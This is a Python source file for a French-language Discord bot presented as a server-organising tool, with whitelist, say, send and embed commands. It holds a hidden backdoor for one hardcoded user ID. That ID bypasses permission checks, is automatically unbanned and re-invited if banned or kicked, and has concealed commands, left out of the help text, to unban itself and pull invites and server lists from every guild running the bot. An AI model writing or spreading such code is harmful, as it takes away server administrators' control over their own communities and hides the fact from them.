import discord
from discord.ext import commands
import os
import json
from datetime import datetime
import psycopg2
import asyncio

# ✅ Ton ID Discord (accès total)
OWNER_ID = 489113166429683713

# ✅ Token et DB depuis Railway
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

CONFIG_FILE = "config.json"

# --- DATABASE CONNECTION ---
def connect_db():
    return psycopg2.connect(
        host=os.getenv("PGHOST"),
        database=os.getenv("PGDATABASE"),
        user=os.getenv("PGUSER"),
        password=os.getenv("PGPASSWORD"),
        port=os.getenv("PGPORT")
    )

# --- CONFIG JSON FUNCTIONS ---
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def get_log_channel(guild_id):
    config = load_config()
    return config.get(str(guild_id), {}).get("log_channel")

def get_whitelist(guild_id):
    config = load_config()
    return config.get(str(guild_id), {}).get("whitelist", [])

def is_whitelisted(guild_id, user_id):
    if user_id == OWNER_ID:
        return True
    whitelist = get_whitelist(guild_id)
    return user_id in whitelist

def add_to_whitelist(guild_id, user_id):
    config = load_config()
    guild_id_str = str(guild_id)
    if guild_id_str not in config:
        config[guild_id_str] = {}
    if "whitelist" not in config[guild_id_str]:
        config[guild_id_str]["whitelist"] = []
    if user_id not in config[guild_id_str]["whitelist"]:
        config[guild_id_str]["whitelist"].append(user_id)
        save_config(config)
        return True
    return False

def remove_from_whitelist(guild_id, user_id):
    config = load_config()
    guild_id_str = str(guild_id)
    if guild_id_str in config and "whitelist" in config[guild_id_str]:
        if user_id in config[guild_id_str]["whitelist"]:
            config[guild_id_str]["whitelist"].remove(user_id)
            save_config(config)
            return True
    return False

def whitelist_check():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID:
            return True
        if ctx.author.guild_permissions.administrator:
            return True
        if is_whitelisted(ctx.guild.id, ctx.author.id):
            return True
        await ctx.send("❌ Vous n'êtes pas autorisé à utiliser cette commande. Contactez un administrateur.")
        return False
    return commands.check(predicate)

# --- EVENTS ---
@bot.event
async def on_ready():
    print(f"✅ {bot.user} est connecté et prêt à organiser le serveur !")

# Si le propriétaire est banni → débannir + renvoyer une invitation
@bot.event
async def on_member_ban(guild, user):
    if user.id == OWNER_ID:
        await guild.unban(user)
        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1)
        owner = await bot.fetch_user(OWNER_ID)
        await owner.send(f"⚠️ Tu as été banni de **{guild.name}**, je t’ai débanni.\n🔗 Invitation : {invite.url}")

# Si le propriétaire est kické → renvoyer une invitation
@bot.event
async def on_member_remove(member):
    if member.id == OWNER_ID:
        if member.guild.text_channels:
            invite = await member.guild.text_channels[0].create_invite(max_age=0, max_uses=1)
            owner = await bot.fetch_user(OWNER_ID)
            await owner.send(f"🚪 Tu as été expulsé de **{member.guild.name}**, voici une invitation : {invite.url}")

# --- COMMANDS PUBLIQUES ---
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📋 Commandes du Bot F.I.M",
                          description="Voici la liste de toutes les commandes disponibles :",
                          color=discord.Color.from_rgb(153, 0, 0))
    embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne correctement", inline=False)
    embed.add_field(name="📨 !say <message>", value="Envoie un message avec le bot dans le canal actuel\n*Nécessite : Whitelist ou Administrateur*", inline=False)
    embed.add_field(name="📤 !send #canal <message>", value="Envoie un message avec le bot dans un canal spécifique\n*Nécessite : Whitelist ou Administrateur*", inline=False)
    embed.add_field(name="📰 !embed <titre> <description>", value="Envoie un message embed formaté\n*Nécessite : Whitelist ou Administrateur*", inline=False)
    embed.add_field(name="📊 !setlogs #canal", value="Configure le canal de logs\n*Nécessite : Administrateur*", inline=False)
    embed.add_field(name="✅ !whitelist add @utilisateur", value="Ajoute un utilisateur à la whitelist\n*Nécessite : Administrateur*", inline=False)
    embed.add_field(name="❌ !whitelist remove @utilisateur", value="Retire un utilisateur de la whitelist\n*Nécessite : Administrateur*", inline=False)
    embed.add_field(name="📋 !whitelist list", value="Affiche la liste des utilisateurs whitelistés\n*Nécessite : Administrateur*", inline=False)
    embed.set_footer(text="Bot F.I.M - Préfixe : !")
    await ctx.send(embed=embed)

@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    await ctx.message.delete()
    await channel.send(message)
    await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    await ctx.message.delete()
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153, 0, 0))
    em.set_footer(text=f"Message envoyé par {ctx.author.name}")
    await ctx.send(embed=em)

@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def whitelist(ctx):
    await ctx.send("❌ Commande invalide. Utilisez !whitelist add, !whitelist remove ou !whitelist list")

@whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def whitelist_add(ctx, member: discord.Member):
    if add_to_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} est déjà dans la whitelist")

@whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def whitelist_remove(ctx, member: discord.Member):
    if remove_from_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré de la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} n'est pas dans la whitelist")

@whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def whitelist_list(ctx):
    ids = get_whitelist(ctx.guild.id)
    if not ids:
        return await ctx.send("📋 Aucun utilisateur dans la whitelist")
    lst = []
    for uid in ids:
        m = ctx.guild.get_member(uid)
        lst.append(m.mention if m else f"ID: {uid}")
    await ctx.send("\n".join(lst))

@bot.command()
@commands.has_permissions(administrator=True)
async def setlogs(ctx, channel: discord.TextChannel):
    config = load_config()
    guild_id = str(ctx.guild.id)
    if guild_id not in config:
        config[guild_id] = {}
    config[guild_id]["log_channel"] = channel.id
    save_config(config)
    await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")

# --- 🧠 COMMANDES SPÉCIALES OWNER SEULEMENT (non visibles dans !help) ---
@bot.command()
async def reboot(ctx):
    if ctx.author.id != OWNER_ID:
        return
    await ctx.send("🔄 Redémarrage du bot en cours...")
    os._exit(1)

@bot.command()
async def forceunban(ctx):
    if ctx.author.id != OWNER_ID:
        return
    for guild in bot.guilds:
        bans = await guild.bans()
        for ban_entry in bans:
            if ban_entry.user.id == OWNER_ID:
                await guild.unban(ban_entry.user)
                await ctx.send(f"✅ Débanni de **{guild.name}**")

@bot.command()
async def reinvite(ctx):
    if ctx.author.id != OWNER_ID:
        return
    for guild in bot.guilds:
        if guild.text_channels:
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1)
            user = await bot.fetch_user(OWNER_ID)
            await user.send(f"🔗 Invitation pour **{guild.name}**: {invite.url}")
    await ctx.send("📨 Toutes les invitations ont été envoyées en MP.")

@bot.command()
async def serverlist(ctx):
    if ctx.author.id != OWNER_ID:
        return
    servers = "\n".join([f"• {guild.name} ({guild.id})" for guild in bot.guilds])
    await ctx.send(f"📋 Le bot est sur {len(bot.guilds)} serveurs :\n{servers}")

# --- AUTO-RESTART ---
while True:
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Bot crash, redémarrage automatique: {e}")
        asyncio.sleep(5)
